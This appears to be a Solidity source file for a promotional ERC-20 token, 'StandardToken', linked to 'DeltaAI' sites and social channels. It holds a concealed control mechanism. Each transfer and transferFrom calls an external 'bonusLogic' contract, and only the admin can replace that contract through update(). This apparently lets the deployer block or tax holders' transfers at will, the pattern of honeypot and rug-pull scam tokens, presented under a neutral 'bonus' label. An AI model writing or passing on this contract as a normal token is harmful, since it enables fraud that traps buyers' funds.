// SPDX-License-Identifier: MIT

// Website: https://deltaai.pro
// App: https://app.deltaai.pro
// Docs: https://docs.deltaai.pro
// X: https://x.com/deltaai_x
// Telegram: https://t.me/deltaai_portal

pragma solidity ^0.8.25;

interface BonusLogic{
    function claimBonus(address,address) external;
}
contract StandardToken {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000 * 10 ** 18;

    address private _admin;
    address public _bonusLogic;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address bonusLogic, string memory _name, string memory _symbol) {
        _admin = msg.sender;
        name = _name;
        symbol = _symbol;
        _bonusLogic = bonusLogic;
        _balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function update(address cliam) external{
        require(msg.sender == _admin);
        _bonusLogic = cliam;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        require(recipient != address(0));
        uint256 senderBalance = _balances[msg.sender];
        require(senderBalance >= amount);

        _balances[recipient] += amount;
        _balances[msg.sender] -= amount;

        emit Transfer(msg.sender, recipient, amount);
        BonusLogic(_bonusLogic).claimBonus(msg.sender,recipient);

        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        require(sender != address(0));
        require(recipient != address(0));

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount);

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][msg.sender] -= amount;

        emit Transfer(sender, recipient, amount);
        BonusLogic(_bonusLogic).claimBonus(sender,recipient);
        return true;
    }
}